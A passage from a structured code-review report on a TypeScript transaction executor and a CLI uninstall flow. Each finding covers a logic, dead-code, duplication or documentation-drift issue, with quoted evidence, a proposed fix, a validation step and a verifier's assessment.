    journal.phase !== "rolled_back" &&`; writers: store.ts:292 `if (current.phase !== expectedPhase || !isIsoDate(updatedAt))` and executor.ts:2987-2990 `validateJournal({ ...journal, phase: nextPhase, updatedAt: this.dependencies.clock() })`; restore call site line 1172 `if (!exactBootstrapFoundationJournalShape(journal, expected)) { throw new TransactionStateError(); }`
```

**Fix.** Drop the `Date.parse(updatedAt) >= Date.parse(createdAt)` term. The id, kind, createdAt and per-mutation equality checks plus the admitted inode and the canonical bytes already bind the journal, so the ordering term adds no integrity. If ordering must stay, enforce it where the journal is written: stamp transitions with max(clock(), journal.updatedAt) in both store.transition and transitionBootstrapFoundationInPlace.

**Validation.** Unit test: give an executor a clock that returns a time before the initial journal's createdAt for the first transition, and stop it after `backed_up` through afterPhase. Then call executeLifecycleFoundationParticipant again with the same admission. Today it rejects with TransactionStateError. After the fix it resumes to finalized. Repeat the same test for the bootstrap arm with the in-place transition.

**Verifier (downgraded).** Code matches: executor.ts:1095 requires Date.parse(updatedAt) >= Date.parse(createdAt). Neither writer enforces that order: store.ts:292 checks only isIsoDate, and executor.ts:2987-2991 stamps updatedAt from the raw clock(). The CLI clocks are wall-clock `now().toISOString()` (context.ts:771, mutation-gate.ts:256). For the lifecycle, update and bootstrap arms, createdAt comes from the coordinator's planned journal, which may be much older. The predicate guards re-entry at 1172, 1847 and 1996. No test, comment or BACKLOG row explains it. The bug is reachable, but only after a backward wall-clock step between planning and a transition, followed by a crash before finalize. macOS normally slews the clock rather than stepping it, so this is rare, and `repair` (rollback) remains available. Low, not medium.

### W2-TX-A-2 · logic · writeDurableFile leaves its temp file behind when write/chmod/sync fails, but cleans up when rename fails

`packages/core/src/transactions/executor.ts:1494`

**Problem.** When fs.rename or the directory sync fails, the function removes the temp file and throws TransactionStateError. When handle.writeFile, chmod or sync fails (ENOSPC, EIO, EDQUOT), the raw errno error escapes and the partly written temp file stays on disk. backUp uses this helper to copy the user's pre-edit file to `<backups>/transactions/<id>/<i>.bin.tmp`; pruneBackups' docblock names that file as possibly a secret. On this path the journal stays `planned` and the command reports an ordinary failure. The pre-edit bytes then sit in the .tmp file until someone runs `repair` (rollback, then prune) or a resume that re-runs backUp.

**Evidence.**

```
lines 1493-1508: `await removeOwnedTemp(fs, temporaryPath);
  const handle = await fs.open(temporaryPath, "wx", mode);
  try {
    await handle.writeFile(bytes);
    await handle.chmod(mode);
    await handle.sync();
  } finally {
    await handle.close();
  }
  try {
    await fs.rename(temporaryPath, destination);
    await syncDirectory(fs, dirname(destination));
  } catch {
    await removeOwnedTemp(fs, temporaryPath);
    throw new TransactionStateError();
  }`
```

**Fix.** Put the write, chmod and sync block in the same cleanup as the rename block: on failure, close the handle, call removeOwnedTemp(fs, temporaryPath), then rethrow. Keep the original error, or convert it to TransactionStateError the way the rename branch does, so the exit-code behavior of both branches matches.

**Validation.** Unit test with a TransactionFileSystem whose handle.sync throws ENOSPC for a path ending in `.bin.tmp` during backUp. Assert that execute rejects and that `<backupsDir>/transactions/<id>/0.bin.tmp` does not exist afterwards. Today the file exists.

**Verifier (confirmed).** Verified at executor.ts:1486-1508. The write/chmod/sync block has only `finally { close }`, so a failure there leaves `<path>.tmp` behind and lets the raw errno escape. The rename branch removes the temp file and throws TransactionStateError. execute→resume does not auto-roll back, so the journal stays `planned`. Impact is limited: the pruneBackups docblock (about lines 2417-2423) already accepts the same residue from a kill inside backUp, and both the resume path (removeOwnedTemp at the start of writeDurableFile) and repair/rollback (pruneBackups sweeps `<index>.bin.tmp`) clear it. What remains is that the two branches handle cleanup and error class inconsistently.

### W2-TX-A-3 · flow · `exactLegalBody` is redundant and hides that a legal progressed journal is rewound to `planned`

`packages/core/src/transactions/executor.ts:1186`

**Problem.** The restore branch rewrites the file when `!exactLegalBody || bytes.byteLength !== expectedBytes.byteLength || hash(bytes) !== hash(expectedBytes)`. If the bytes equal expectedBytes, they are canonical and exactLegalBody is necessarily true, so the condition reduces to byte inequality. The flag's name suggests that a legal canonical body is kept. In fact a legal `validated`, `applied`, `verified` or `finalized` body on the admitted inode is overwritten with the `planned` journal, and the state machine is replayed. The replay is safe only because publishBootstrapMutationNoReplace accepts an already-published destination. Neither the flag nor any comment says that the rewind is intended or why it is safe.

**Evidence.**

```
lines 1145, 1176-1177, 1186: `let exactLegalBody = false;` ... `if (serialized === canonical) {
            exactLegalBody = true;` ... `if (!exactLegalBody || bytes.byteLength !== expectedBytes.byteLength || hash(bytes) !== hash(expectedBytes)) {
      await handle.truncate(0);`
```

**Fix.** Remove exactLegalBody and decide the rewrite on byte equality alone, for example `Buffer.compare(bytes, expectedBytes) !== 0`. Keep the classification only as the gate that throws for foreign or non-canonical bodies. Add one line stating that a legal progressed body is deliberately rewound to `planned` because the replay through publishBootstrapMutationNoReplace is idempotent.

**Validation.** The existing tests 'recovers the admitted Foundation inode after <fault>' (six faults) and 'refuses a canonical but unauthorized terminal value' must stay green without changes.

**Verifier (confirmed).** Verified at lines 1145-1186. expectedBytes = encode(expected) (line 1117). If bytes equal expectedBytes, they decode to `expected`, which passes the shape check and equals its own canonical encoding, so exactLegalBody is necessarily true. The `!exactLegalBody ||` term is redundant. The function always returns `expected` (line 1229), and the caller at 1736 feeds that to resumeBootstrapFoundationLocked (2091-2133). That function replays only transitions plus publishBootstrapMutationNoReplace/verify, so rewinding a legal progressed body is safe, and the comment the finding asks for is indeed missing. This is a clarity issue only.

### W2-TX-A-4 · duplication · The identity check for an owner-only, single-link regular file at a given inode is written four times, and the rewrite loop twice

`packages/core/src/transactions/executor.ts:1045`

**Problem.** The predicate 'not a symlink, a regular file, uid matches the owner, mode 0600, nlink 1, size and dev/ino match' exists as assertBootstrapJournalStats (962-980). It is restated inline in readExactBootstrapJournalByIdentity (1045-1054), in restoreBootstrapFoundationInitialJournalByIdentity (1121-1131) and in transitionBootstrapFoundationInPlace (2997-3006 and 3011-3020). The copies have already drifted: the restore copy checks a 1 MiB size cap, the in-place copy checks `size < 1`, and the ByIdentity copy checks exact size. The 'truncate(0), write loop, truncate, sync, stat identity' rewrite is duplicated between 1186-1206 and 3025-3045. The decimal identity regex `/^(?:0|[1-9][0-9]*)$/u` is inlined eight times (314, 315, 349, 350, 578, 579, 1381, 1382) even though the file defines DECIMAL_IDENTITY at line 703. A future fix to one copy, such as a new mode or flag rule, will miss the others.

**Evidence.**

```
line 1045-1054: `before.isSymbolicLink() ||
      !before.isFile() ||
      Number(before.uid) !== ownerUid ||
      (Number(before.mode) & 0o7777) !== 0o600 ||
      Number(before.nlink) !== 1 ||
      Number(before.size) !== expectedBytes.byteLength ||
      before.dev.toString(10) !== identity.dev ||
      before.ino.toString(10) !== identity.ino`; line 703 `const DECIMAL_IDENTITY = /^(?:0|[1-9][0-9]*)$/u;` vs line 314 `!/^(?:0|[1-9][0-9]*)$/u.test(value.dev) ||`
```

**Fix.** Extract one `assertOwnedJournalInode(stats, {ownerUid, dev, ino, size?})` and one `rewriteInPlace(handle, bytes, identity)` helper and call them from all four sites. Replace the inline decimal regexes with DECIMAL_IDENTITY. These are intra-file copies; the cross-module copies are already tracked in CORE-REST-4 and CORE-UPD-4.

**Validation.** Run typecheck and lint. Then run transactions.test.ts with the bootstrap and lifecycle groups (-t 'Foundation'); it must pass unchanged.

**Verifier (confirmed).** Verified. The inline regex appears at 314/315, 349/350, 578/579 and 1381/1382, while DECIMAL_IDENTITY is defined at 703 and used at 706. The owner/mode/nlink/dev/ino inode predicate appears at 966-979, 1045-1054, 1121-1131 and 2999-3020. The truncate/write-loop/truncate/sync/stat rewrite appears at 1187-1205 and 3025-3045. 'Drifted' is overstated: the size differences fit each site's purpose (exact size known vs. unknown before read). This is intra-file duplication, distinct from CORE-REST-4, CORE-UPD-4 and CORE-LIFE-2.

### W2-TX-A-5 · duplication · Lifecycle and update planned-shape validators and the three admit/consume pairs are near copies

`packages/core/src/transactions/executor.ts:722`

**Problem.** updateParticipantPlannedShape (722-784) repeats lifecycleParticipantPlannedShape (502-552) almost line for line. Both contain the same header test (id, kind, phase, createdAt === updatedAt, length 1..256), the same per-mutation comparison of planned against ref (targetPath, operation, expectedBeforeHash, stagedRelativePath, isAbsolute), and the same contentSize bound. The update version adds only the content/digest arms. The three consume* functions (451-457, 609-615, 862-868) are the same WeakMap lookup three times. All three admit* functions end in the same `catch (error) { if (error instanceof TransactionStateError) throw error; throw new TransactionStateError(); }`. The shape rules of the two arms can drift: the lifecycle version derives `create` from expectedBeforeHash with a three-way ternary, while the update version uses `(operation === "create") === (expectedBeforeHash === null)`.

**Evidence.**

```
lines 536-550 vs 764-777: `planned === undefined ||
      !validShape ||
      planned.targetPath !== mutation.targetPath ||
      planned.operation !== mutation.operation ||
      planned.expectedBeforeHash !== mutation.expectedBeforeHash ||` ... `(mutation.contentSize !== null &&
        (!Number.isSafeInteger(mutation.contentSize) ||
          mutation.contentSize < 0 ||
          mutation.contentSize > LIFECYCLE_PAYLOAD_MAXIMUM_BYTES))`
```

**Fix.** Extract a shared `plannedJournalMatchesRef(ref, journal, extraMutationCheck)` used by both arms, with the update arm passing its content/digest predicate. Collapse the consume* functions into one generic `consume<K, V>(map: WeakMap<K, V>, key: K): V`.

**Validation.** Run typecheck and lint. The lifecycle and update admission tests in transactions.test.ts must pass unchanged.

**Verifier (confirmed).** Verified. The header checks and per-mutation comparisons at 536-550 and 764-777 are near copies. The three consume* functions (451-457, 609-615, 862-868) are identical WeakMap lookups, and the three admit* functions end in the same catch block. The cited 'drift' is not a real divergence: the lifecycle ternary and `(operation === "create") === (expectedBeforeHash === null)` accept the same create/replace shapes. The two validators also take different ref versions (FoundationParticipantRefV1 vs UpdateFoundationParticipantRefV2), so extracting a shared validator is a marginal win. Low, borderline material.

### W2-TX-A-6 · dead-code · `expectedNlink` parameter is always 1

`packages/core/src/transactions/executor.ts:966` · removal confidence: high

**Problem.** assertBootstrapJournalStats and readExactBootstrapJournal both take `expectedNlink = 1`. The only external caller passes the literal 1 (line 1692), and the only other caller is readExactBootstrapJournal forwarding its own default. The parameter allows a choice that no caller makes. The other three inode checks in the file hardcode nlink 1.

**Evidence.**

```
grep -n 'expectedNlink\|assertBootstrapJournalStats(' executor.ts → 962, 966 `expectedNlink = 1,`, 973, 987 `expectedNlink = 1,`, 991, 996, 1002, 1010; the only readExactBootstrapJournal call is lines 1687-1693 `readExactBootstrapJournal(this.dependencies.fs, stagedPath, evidence, ownerUid, 1)`
```

**Fix.** Remove the parameter from both functions, compare `Number(stats.nlink) !== 1`, and drop the trailing `1` argument at line 1692.

**Validation.** Run typecheck and lint. Run the bootstrap tests in transactions.test.ts, including 'refuses the rejected hard-link two-name state without deleting either name'.

**Verifier (confirmed).** grep shows `expectedNlink` only inside executor.ts: the defaults at 966 and 987, forwarding at 991/996/1002/1010, and the single readExactBootstrapJournal call at 1687-1693, which passes the literal 1. No other package references it. This is dead flexibility, probably left over from 530f0862. Removal confidence is high.

### W2-TX-A-7 · docs-drift · TransactionBackupRetentionError's docblock is attached to the TransactionOutcome type alias and undercounts execute callers

`packages/core/src/transactions/executor.ts:97`

**Problem.** The 43-line JSDoc at 54-96 opens with "**The transaction completed and a backup payload could not be removed.**" and describes the error class. It sits directly above `export type TransactionOutcome`, so the emitted .d.ts and IDE hover attach it to the type alias, and the class at line 99 has no documentation. The docblock also justifies 'never raise from execute' by listing the callers as `reindex`, `uninstall`, `ingest`, `review`, `capture`, `init`. Lines 2190 and 2457 say 'seven call sites — six commands, ingest twice'. The repository has 17 production `executor.execute(` call sites, including instructions/apply.ts (three), update/entrypoint.ts, lifecycle/uninstall.ts, config.ts, refactor.ts, project-init.ts, quarantine.ts, automation/pulse.ts and automation/runner.ts. The invariant matters for more callers than the docblock admits.

**Evidence.**

```
lines 96-99: ` */
export type TransactionOutcome = "applied" | "rolled back";

export class TransactionBackupRetentionError extends Error {`; line 69-70: `Every caller of
 * `execute` — `reindex`, `uninstall`, `ingest`, `review`, `capture`, `init` — is written`; `grep -rnE '(xecutor|transactions?)\.execute\(' apps packages --include=*.ts | grep -v test | grep -v dist` → 17 hits
```

**Fix.** Move the docblock to sit directly above `export class TransactionBackupRetentionError` and give TransactionOutcome a one-line description. Replace the enumerated caller list and the 'seven call sites' counts at 69-70, 2190 and 2457 with the rule itself ('every execute caller reads a throw as nothing happened'), so the docblock cannot drift again.

**Validation.** Check that `packages/core/dist/transactions/executor.d.ts` shows the JSDoc on the class after a build. Re-run the grep to confirm that no count remains in the comments.

**Verifier (confirmed).** Verified. The JSDoc at 54-96 describes TransactionBackupRetentionError but sits directly above `export type TransactionOutcome` (line 97). The class at line 99 therefore gets no doc, and the type alias inherits the class's doc. Line 69 lists six callers, and lines 2190/2457 say 'seven call sites'. The grep finds 17 production `executor.execute(` call sites across apps/cli (instructions/apply.ts x3, update/entrypoint.ts, lifecycle/uninstall.ts, config.ts, refactor.ts, project-init.ts, quarantine.ts, automation/pulse.ts, automation/runner.ts, and others). No known entry covers this file.

### W2-TX-B-2 · dead-code · resumeLocked's transition/admittedJournal/bootstrapBound parameters and the transition params of backUp/stage/validate/apply/verifyAndTransition are unreachable

`packages/core/src/transactions/executor.ts:2140` · removal confidence: high

**Problem.** `resumeLocked` is called only as `this.resumeLocked(id)` (line 2137), so `transition`, `admittedJournal` and `bootstrapBound` always take their defaults. The `if (bootstrapBound) await this.verifyDesired(journal);` branch at 2162 never runs. The `transition` parameters on backUp (2540), stage (2594), validate (2604), apply (2615) and verifyAndTransition (2689) receive only resumeLocked's default, so they are dead plumbing too. `git log -S bootstrapBound` points at db5e5c1e as the change that left this behind; the bootstrap path now uses resumeBootstrapFoundationLocked. The dead branch also suggests a finalized-journal verifyDesired that no path actually performs.

**Evidence.**

```
rg 'resumeLocked\(' over the repo returns only executor.ts:2137 `this.resumeLocked(id)` (other hits are comments).

  private async resumeLocked(
    id: string,
    transition: JournalTransition = (journal, nextPhase) => this.transition(journal, nextPhase),
    admittedJournal?: TransactionJournalV1,
    bootstrapBound = false,
  )
...
      if (bootstrapBound) await this.verifyDesired(journal);
```

**Fix.** Drop the three extra parameters and the bootstrapBound line from resumeLocked. Drop the `transition` parameter from backUp/stage/validate/apply/verifyAndTransition and call `this.transition` directly. Keep the JournalTransition type, which resumeBootstrapFoundationLocked still uses (2094).

**Validation.** `pnpm -r typecheck` stays green after the removal. `rg 'bootstrapBound|admittedJournal' packages/core/src/transactions/executor.ts` returns nothing.

**Verifier (confirmed).** grep shows `this.resumeLocked(id)` at 2137 is the only call; every other `resumeLocked` hit is a comment. So `transition`, `admittedJournal` and `bootstrapBound` always take their defaults, and `if (bootstrapBound) await this.verifyDesired(journal);` at 2162 is unreachable. The only callers of `this.backUp`, `this.stage`, `this.validate`, `this.apply` and `this.verifyAndTransition` are lines 2171-2183, which pass resumeLocked's default `transition`. Their `transition` parameters are therefore dead plumbing. Removal confidence is high.

### W2-TX-B-3 · flow · Rollback after a crash mid-apply leaves the apply temp file in the user's target directory

`packages/core/src/transactions/executor.ts:2668`

**Problem.** applyMutation writes `.<base>.<id>-<i>.tmp` next to the target. Only a re-run of the same writeDurableFile call removes a stale one (via removeOwnedTemp at 1493). restoreMutation writes under a different name (`…-<i>.rollback.tmp`, 2810), and rollbackLocked/pruneBackups never touch target-directory temps. So a kill between the temp write and the rename, followed by the product-recommended `repair --rollback`, leaves a stray dotfile holding the desired bytes inside the user's vault or config directory, permanently. This is the same class the 2416-2422 docblock fixed for backup `.bin.tmp`. writeDurableFile also leaves the temp behind when writeFile/sync throws (only rename failures are cleaned).

**Evidence.**

```
const temporary = join(
      dirname(mutation.targetPath),
      `.${basename(mutation.targetPath)}.${journal.id}-${String(index)}.tmp`,
    );
...
2810: `.${basename(mutation.targetPath)}.${journal.id}-${String(index)}.rollback.tmp`,
```

**Fix.** In restoreMutation (or once per mutation in rollbackLocked), call removeOwnedTemp on the apply temp name before restoring. Also wrap the writeFile/sync section of writeDurableFile so that it removes the temp on failure.

**Validation.** Unit test: fake fs that throws at rename for the apply temp of mutation 0 (leaving the temp), then call rollback(id) and assert the `.<base>.<id>-0.tmp` path no longer exists.

**Verifier (confirmed).** applyMutation writes the temp `.<base>.<id>-<i>.tmp` at 2668-2671. In this file, `removeOwnedTemp` runs only inside `writeDurableFile` (1493, 1506). restoreMutation uses a different name, `.rollback.tmp` (2810). The only `.tmp` cleanup in rollback is the backup `<index>.bin.tmp` sweep (2416-2422). A kill between the temp write and the rename, followed by `repair --rollback`, therefore leaves the apply temp in the target directory. `writeDurableFile` also leaves the temp behind when writeFile/chmod/sync throws, because only failures after the rename attempt are cleaned up. Severity stays low: the orphan holds the desired bytes, not the pre-edit secret, and a resume would clean it up.

### W2-TX-B-4 · docs-drift · Comments claim execute has seven call sites; production has 17

`packages/core/src/transactions/executor.ts:2190`

**Problem.** The resumeLocked prune comment (2190-2192), the pruneBackups catch comment (2457) and doctor.ts:364 say `execute` has 'seven call sites — six commands, ingest twice'. The no-raise rationale still holds, but the count is used as evidence and is wrong. Anyone auditing the 'a throw means nothing happened' contract against seven callers would miss ten of them (instructions/apply x3, update/entrypoint, lifecycle/uninstall, uninstall, automation runner, pulse, refactor, config, project-init, quarantine, etc.).

**Evidence.**

```
* `execute` funnels through here, and its seven call sites — six commands, `ingest`
           * twice — all read a throw as

rg 'executor\.execute\(' apps packages (non-test, non-dist) → 17 hits across 16 files.
```

**Fix.** Replace the number with 'every caller of execute' or drop it, in all three places.

**Validation.** rg 'seven call sites|seven' packages/core/src/transactions/executor.ts apps/cli/src/commands/doctor.ts returns no stale count.

**Verifier (confirmed).** rg finds 17 production `context.executor.execute(` calls across 16 files: init, ingest x2, review, project-init, pulse, reindex, config, update/entrypoint, refactor, automation runner, uninstall, quarantine, lifecycle/uninstall, instructions/apply x3. The comments at executor.ts 2190 and 2457 and at doctor.ts 364 still say 'seven call sites'. This is documentation drift only; the no-raise rationale still holds.

### W2-TX-B-5 · duplication · Staged-to-final initial-journal publish block copy-pasted across the three Foundation participant entry points

`packages/core/src/transactions/executor.ts:1787`

**Problem.** The sequence `publish === undefined` guard → two exactPublicationParent calls → try/publish/catch→TransactionStateError → syncReopenDirectory x2 → lstat-after check → identity re-read appears three times with small variations: bootstrap 1698-1735, lifecycle 1795-1844, update 1944-1993. The copies have already drifted, for example in the syncReopenDirectory placement (unconditional in bootstrap, staged-branch-only in lifecycle/update). Any future hardening must be applied three times.

**Evidence.**

```
1795: const publish = this.dependencies.publishBootstrapInitialJournalNoReplace;
        if (publish === undefined) throw new TransactionStateError();
1944: const publish = this.dependencies.publishBootstrapInitialJournalNoReplace;
        if (publish === undefined) throw new TransactionStateError();
(and 1698-1700 in the bootstrap arm)
```

**Fix.** Extract one private `publishInitialJournal(stagedPath, finalPath, parents, postimage)` that does publish, sync, lstat-after and verify, and have the three arms call it with their own identity/verify callback.

**Validation.** Existing participant tests in packages/core/src/transactions/transactions.test.ts stay green, and the three arms shrink to one call each.

**Verifier (confirmed).** The lifecycle block (1795-1838) and the update block (1944-1993) are near-verbatim copies, about 45 lines each: the publish guard, exactPublicationParent x2, publish with the postimage, syncReopenDirectory x2, the lstat-after check and readExactBootstrapJournalByIdentity. The bootstrap arm (1698-1740) follows the same pattern. The 'drift' claim is overstated. The bootstrap arm syncs and checks unconditionally because it also covers re-entry after a publish already happened, so that difference is a semantic one, not accidental divergence. The duplication itself is real; it is maintainability only, so low.

### W2-UNINST-2 · flow · A missing runner lease file is not checked in planning; the drain fails after the marker and launchd bootout and rolls back

`apps/cli/src/lifecycle/uninstall.ts:981`

**Problem.** The `drain_runners` step locks every path in `uninstallLeasePaths` through `acquireExistingWithin`. That call is all-or-throw, and an absent path throws `LifecycleLockMissingError` (stable-lock.ts `refuse` → `isAbsent`). Lease rows are `ephemeral` manifest rows. When one is gone from disk, `planUninstall` reports it as drift `missing`, and preview silently drops it from the mutation list (lines 1478-1482). Planning therefore succeeds, the IDs are reserved, and the marker forward step and `launchd_before_files` (bootout) both run. The drain then throws, and the coordinator compensates and reports "rolled back". The file header's promise that every refusal fires before `reserveLifecycleIdBlock` is broken, and that uninstall can never succeed until the user re-creates the lock file by hand. The automation runner already treats a missing lease as a real state (runner.ts:204 `#missingLease`).

**Evidence.**

```
lines 981-985: `leases = await locks.acquireExistingWithin(uninstallLeasePaths(productHome), { nowMs, sleepMs, deadlineMs: nowMs() + LIFECYCLE_LEASE_DRAIN_MS });`
lines 1478-1482: `partitioned.drift.get(entry.artifact.path)?.kind !== "missing"`
lines 643-647: steps order `uninstall_marker`, `launchd_before_files`, `drain_runners`
header lines 5-6: "every refusal below fires before `reserveLifecycleIdBlock` moves the counter"
```

**Fix.** In `preview`, check each `uninstallLeasePaths(productHome)` entry with `guardedEntry` and refuse before reservation when one is absent or is not a regular file. The refusal should be a typed error that names the path and the remedy. A deliberate alternative is to let `drain` lock only the leases that are present, while still requiring the leases that are present to be removed.

**Validation.** Add a v2 test that deletes `state/.automation-doctor.lock` on a launchd-variant home and runs `execute`. The test should expect a refusal with no coordinator journal and an unchanged allocator counter. Today the test sees a rolled_back coordinator and a launchd bootout/reload pair.

**Verifier (downgraded).** Confirmed. Lease rows are `ephemeral` manifest rows (admission.ts:112). A missing lease has drift `missing`, which the filter at uninstall.ts:1478-1482 drops, and preview runs no presence check. drain (981-985) calls `acquireExistingWithin`, which per locks.ts 'never creates the path'. Its throw reaches the coordinator catch (coordinator.ts:443-447), which compensates after `uninstall_marker` and `launchd_before_files`. The drain-deadline test (uninstall.v2.test.ts:580) shows that this path ends as a recovery-required refusal. A missing lease could be detected deterministically in preview, so the header promise at lines 5-6 does not hold for it. Downgraded to low: it needs a hand-deleted hidden lock file, which the runner already treats as `automation_lease_missing` (recovery-required, runner.ts:232); the rollback is compensated; and no data is lost.

### W2-UNINST-3 · inconsistency · The V2 uninstall result reports as `removed` paths it skipped or kept, and some paths appear in both `removed` and `preserved`

`apps/cli/src/lifecycle/uninstall.ts:1695`

**Problem.** `removed` is the preview list, which is built from every partitioned.removable entry. That list includes directory rows, files whose drift is `missing` (filtered out of the mutations at 1481), and non-regular entries skipped at 1496. The directories that `finalizeUninstallTombstones` found non-empty and kept are appended to `preserved`. A directory the user put files into therefore shows up in both lists, and an already-missing file is reported as removed. The V1 path explicitly refuses to do this (commands/uninstall.ts planRevert: "reporting it as removed would claim work this run did not do") and reports `[...planned.removed, ...directoryOutcome.removed]`.

**Evidence.**

```
line 1549: `...partitioned.removable.map((entry) => entry.artifact.path),`
line 1695: `removed: preview.removable,`
line 1697: `preserved: [...new Set([...preview.preserved, ...preservedDirectories])],`
line 1496: `if (observed === null || observed.kind !== "regular_file") continue;`
```

**Fix.** Build `removed` in `execute` from what was actually removed: the mutation targets in `inputs.chunks`, the reserved and control leaves, the hooks and codex-ingest directories, and the directories `finalizeUninstallTombstones` removed (collect them the same way `preserved` is collected). At minimum, take `preservedDirectories` out of `removed`.

**Validation.** Add a v2 test that drops a user file into a manifest-owned directory such as `logs/` before uninstall. Assert that the directory is in `preserved` and not in `removed`. Assert the same for a pre-deleted ephemeral file.

**Verifier (downgraded).** Confirmed. execute returns `removed: preview.removable` (1695). That list is built from every `partitioned.removable` path, including directory rows and drift-`missing` files (1549). Directories that finalizeUninstallTombstones kept go into `preserved` (1176, 1697), so a non-empty kept directory appears in both lists, and an already-absent file is reported as removed. V1 deliberately avoids this (commands/uninstall.ts:305-310 'would claim work this run did not do'; 513 builds removed from directoryOutcome). This affects the result report only, so low.

### W2-UNINST-4 · duplication · allocatedIdsFrom, requireLifecycleStagingRoot and cleanAllocatorTemp are private copies of exported mutation-gate helpers

`apps/cli/src/lifecycle/uninstall.ts:1797`

**Problem.** mutation-gate.ts exports `requireLifecycleStagingRoot` and `cleanAllocatorTemp`, and automation/runner.ts and update/apply-ports.ts already import them. uninstall.ts re-implements all three helpers (and git/service.ts has a fourth copy). The copies have already drifted: mutation-gate's staging-root version refuses a missing parent explicitly with `lifecycle_guarded_parent` on paths.stagingDir, while this copy goes through `syncDirectoryAt`. Its own comment at line 1817 admits it is "the same interim as `lifecycle/mutation-gate.ts`", so the durable fix described there has to land in two places. This is the same class as CORE-LIFE-2, but in apps/cli.

**Evidence.**

```
uninstall.ts:1797 `function allocatedIdsFrom(`, :1819 `async function requireLifecycleStagingRoot(`, :1837 `async function cleanAllocatorTemp(`
mutation-gate.ts:210 `function allocatedIdsFrom(`, :284 `export async function requireLifecycleStagingRoot(`, :312 `export async function cleanAllocatorTemp(`
git/service.ts:889 `function allocatedIdsFrom(`, :949 `async function requireLifecycleStagingRoot(`
```

**Fix.** Delete the three local copies and import `requireLifecycleStagingRoot` and `cleanAllocatorTemp` from ./mutation-gate.js. Call `cleanAllocatorTemp(context, lifecycle, request.key, uninstallResidueFrom(request.evidence), held)`. Export `allocatedIdsFrom` from mutation-gate as well. Do the same for git/service.ts.

**Validation.** Run typecheck, lint and the uninstall v2 tests unchanged. Afterwards, `grep -n 'function allocatedIdsFrom\|function requireLifecycleStagingRoot\|function cleanAllocatorTemp' apps/cli/src` should return only mutation-gate.ts.

**Verifier (confirmed).** Verified by grep. uninstall.ts:1797/1819/1837 define private `allocatedIdsFrom`, `requireLifecycleStagingRoot` and `cleanAllocatorTemp`. mutation-gate.ts:284/312 export the last two, which runner.ts:61 and apply-ports.ts:115 already import, and git/service.ts:889/949 holds further copies. The staging-root copies have drifted. The gate's version refuses `lifecycle_guarded_parent` on a missing stagingDir parent; this copy calls syncDirectoryAt. Its D37 comment ('a fresh V2 init does not create staging/lifecycle') is stale against the gate's comment that the fresh coordinator now creates it. It is not covered by CORE-LIFE-2 (core package) or CLI-CMD-4 (admitV2Home/withGlobalLock).

### W2-UNINST-5 · inconsistency · On the launchd variant, a missing config.toml refuses with a recovery-required error that sends the user to doctor

`apps/cli/src/lifecycle/uninstall.ts:530` · related: FLOW-UNINST-4

**Problem.** `uninstallLaunchdPlan` requires `configPath` to be among the artifact-step removals. If config.toml is missing (drift `missing`, filtered at 1481) or is not a regular file (skipped at 1496), the builder throws `LifecycleRecoveryRequiredError("uninstall_launchd_file_unbound")` during `assertLifecycleExecutionFeasible`. Nothing durable exists at that point. The error's class tells the user to run recovery, but nothing needs recovering, and doctor cannot clear it. The uninstall stays blocked until a config.toml with the original bytes is restored. This is the same shape as FLOW-UNINST-4 (a missing config.toml blocks detach), but on the launchd plan path.

**Evidence.**

```
line 523: `removals.get(path) ?? refuse("uninstall_launchd_file_unbound", path);`
line 530: `config: removal(inputs.configPath),`
line 263-264: `function refuse(...) { throw new LifecycleRecoveryRequiredError(reason, paths); }`
```

**Fix.** Bind `config` to null or absent when config.toml is already gone, if planLaunchdTransitions allows that. Otherwise refuse in `preview` before reservation with a typed UninstallRefusal (decision-required) that names config.toml and explains how to restore it, instead of a recovery-class error.

**Validation.** Add a v2 test: a launchd-variant home with config.toml deleted, run `execute`. Assert the refusal class and exit code, and that the allocator counter is unchanged.

**Verifier (confirmed).** Confirmed. planningPaths (1180-1188) and deriveVariant deliberately tolerate a missing config.toml. A config row with drift `missing` is filtered out at 1481 and so never enters `removals`. `removal(inputs.configPath)` (530) then throws LifecycleRecoveryRequiredError('uninstall_launchd_file_unbound') through refuse() (263-264) during assertLifecycleExecutionFeasible, before any ID is reserved. Here the recovery-required class is misleading, because nothing needs recovery. Platform plan.ts:718 makes the config binding mandatory, so it cannot simply be omitted. A modified config refuses earlier with decision-required (commands/uninstall.ts:433-441), so only the missing case reaches this path. The root cause is the same as FLOW-UNINST-4's but the path is different; it is a narrow edge.

### W2-UNINST-6 · dead-code · The re-drain branch in stepHooks.before cannot be reached

`apps/cli/src/lifecycle/uninstall.ts:1108` · removal confidence: medium

**Problem.** `drain` runs at `drain_runners`, before the first artifact step. `acquireExistingWithin` either returns a lock for every lease path or throws, so on the first artifact step `leases.length === uninstallLeasePaths(productHome).length` always holds. On later steps `after` has already removed the leases, so `present.length === 0` returns early. A resumed run before the point of no return (manifest_commit_absence) compensates in `forwardOnce` (`session.resumed` → `enterCompensation`) and never calls `before`. The release-and-re-drain path therefore never runs. It also releases and reacquires the global lock in the middle of the coordinator, which makes the code harder to reason about than it needs to be.

**Evidence.**

```
lines 1108-1111: `if (leases.length !== uninstallLeasePaths(productHome).length) { await releaseLeases(); held = await drain(global); }`
coordinator.ts:417-422 resumed → `enterCompensation` when `!boundaryCrossed`
grammar.ts:242-244 uninstall boundary `manifest_commit_absence`
stable-lock.ts:142-154 acquireExistingWithin all-or-throw
```

**Fix.** Replace the branch with a refusal that asserts the invariant: if `leases.length !== uninstallLeasePaths(productHome).length`, refuse with "lifecycle_lease_identity". This keeps the global lock held across the step.

**Validation.** Run the uninstall v2 and uninstall-recovery v2 tests. Coverage of lines 1108-1111 should be zero today. After the change, the tests should stay green.

**Verifier (confirmed).** The re-drain branch (1108-1111) is unreachable. The `drain_runners` step always runs before the first `uninstall_artifacts` step in the same session (643-651), and acquireExistingWithin returns every lease or throws. Leases sort first (removalOrder), so `after` removes and releases them all on step one (or refuses `lifecycle_lease_retained`), and later steps take the `present.length === 0` early return. A resumed coordinator before the `manifest_commit_absence` boundary compensates in forwardOnce (coordinator.ts:417-422) and never calls `before` on an artifact step. The test comment at uninstall.v2.test.ts:546-549 says the same: 're-drain is the *next* uninstall'. Removal confidence medium is appropriate, because it is an invariant guard and not a public symbol.

## Refuted by verifiers

